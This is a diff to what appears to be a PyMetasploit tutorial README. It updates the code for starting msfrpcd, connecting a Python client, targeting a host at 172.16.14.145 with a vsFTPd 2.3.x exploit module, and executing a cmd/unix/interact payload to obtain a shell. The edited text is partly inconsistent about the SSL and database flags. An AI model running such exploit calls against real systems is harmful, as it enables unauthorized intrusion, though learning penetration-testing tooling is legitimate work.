@@ -48,12 +48,12 @@ daemon listens on port 55553 on all interfaces (`0.0.0.0:55553`).
 For the purposes of this tutorial let's start the `msfrpcd` daemon with a minimal configuration:
 
 ```bash
-$ ./msfrpcd -P mypassword -n -f -a 127.0.0.1
+$ ./msfrpcd -P mypassword -S -f -a 127.0.0.1
 [*] MSGRPC starting on 0.0.0.0:55553 (SSL):Msg...
 [*] MSGRPC ready at 2014-04-19 23:49:39 -0400.
 ```
 
-The `-f` parameter tells `msfrpcd` to remain in the foreground and the `-n` parameter disables database support.
+The `-S` parameter tells `msfrpcd` not to use SSL and the `-n` parameter disables database support.
 Finally, the `-a` parameter tells `msfrcpd` to listen for requests only on the local loopback interface (`127.0.0.1`).
 
 ## `MsfRpcClient` - Brief Overview
@@ -64,7 +64,7 @@ Let's get started interacting with the Metasploit framework from python:
 
 ```python
 >>> from metasploit.msfrpc import MsfRpcClient
->>> client = MsfRpcClient('mypassword')
+>>> client = MsfRpcClient("mypassword", ssl=False, server="127.0.0.1")
 ```
 
 The `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Let's take a
@@ -149,7 +149,7 @@ machine as our target. Luckily it's running our favorite version of vsFTPd - 2.3
 module loaded in PyMetasploit. Our next step is to specify our target:
 
 ```python
->>> exploit['RHOST'] = '172.16.14.145' # IP of our target host
+>>> exploit[b'RHOST'] = '172.16.14.145' # IP of our target host
 >>>
 ```
 
@@ -157,10 +157,10 @@ You can also specify or retrieve other options as well, as long as they're liste
 method as shown above. For example, let's get and set the `VERBOSE` option:
 
 ```python
->>> exploit['VERBOSE']
+>>> exploit[b'VERBOSE']
 False
->>> exploit['VERBOSE'] = True
->>> exploit['VERBOSE']
+>>> exploit[b'VERBOSE'] = True
+>>> exploit[b'VERBOSE']
 True
 >>>
 ```
@@ -176,7 +176,9 @@ Awesome! So now we're ready to execute our exploit. All we need to do is select 
 At this point, this exploit only supports one payload (`cmd/unix/interact`). So let's pop a shell:
 
 ```python
->>> exploit.execute(payload='cmd/unix/interact')
+>>> from metasploit.msfrpc import PayloadModule
+>>> mypayload = PayloadModule(client, payload=b'cmd/unix/interact')
+>>> exploit.execute(payload=mypayload)
 {'job_id': 1, 'uuid': '3whbuevf'}
 >>>
 ```
